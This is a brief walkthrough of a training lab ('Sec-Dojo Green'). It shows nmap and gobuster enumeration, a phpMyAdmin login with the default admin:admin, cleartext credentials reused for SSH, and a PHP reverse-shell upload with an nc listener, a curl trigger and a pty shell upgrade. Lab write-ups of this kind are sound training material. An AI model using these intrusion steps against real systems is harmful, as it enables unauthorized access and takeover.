Sec-Dojo Green lab
Machine1_ip : 10.8.0.2 --> Login
Machine2_ip : 10.8.0.3 --> Upload


----First Lab --Login---
To start this lab we start with Nmap command to identity open ports
	--> nmap -A 10.8.0.2
	--> open ports
		-22 for ssh
		-80 for http 
At this stage we know that we have a wb server ready for exploitation.
We access to the web server on port 80 but nothing concluant.
The first step is to do is file or directory discovry with the tool gobuster
	--> gobuster dir -u http://10.8.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100 
	After that we found some hidden directories
	-images
	-Javacript
	-phpMyAdmin
	-Views
Here the directory which must contains information is phpmyasmin so we'll go on it 10.8.0.2/phpMyAdmin. Once there we'll try some common default usernames and password. Directly we start with admin:admin and it works. 
Whwn we access to the admin table we found 2 credentials in clear text
	-ubuntu:abcit2020
	-green:xR297gSTr
If we use green credentials to connect to ssh It works. We are able to read to proof.txt file because green has all rights.



----Second challenge
First method --> connect to machine using green credentials and search the way to do priviliege escalation.


Second method --> Access to the web page on port 80 and upload a reverse shell file. After that you will have to open a listner on your system using command 
	--> nc -lnvp 1234
After that you will run your reverse shell for exple name revshell.php using the command:
	--> curl 10.8.0.3/uploads/revshell.php
After running this command the target machine will connect to your machine by listner you open and in the window of listner you will use the command:
	--> python3 -c 'import pty;pty.spawn("/bin/bash")'
to turn the shell into an interactive one. After that you'll found a way to do your privilege escalation.
